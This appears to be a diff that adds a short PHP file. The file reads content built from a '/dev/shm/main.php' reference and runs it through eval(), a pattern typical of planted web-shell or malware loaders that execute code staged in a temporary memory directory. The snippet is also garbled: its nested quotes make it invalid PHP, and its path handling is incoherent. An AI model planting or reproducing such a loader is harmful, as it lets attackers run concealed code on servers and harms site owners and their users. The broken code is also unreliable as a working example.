@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('require('/dev/shm/main.php');'));
+
+$content = "?> ".$content;
+eval($content);
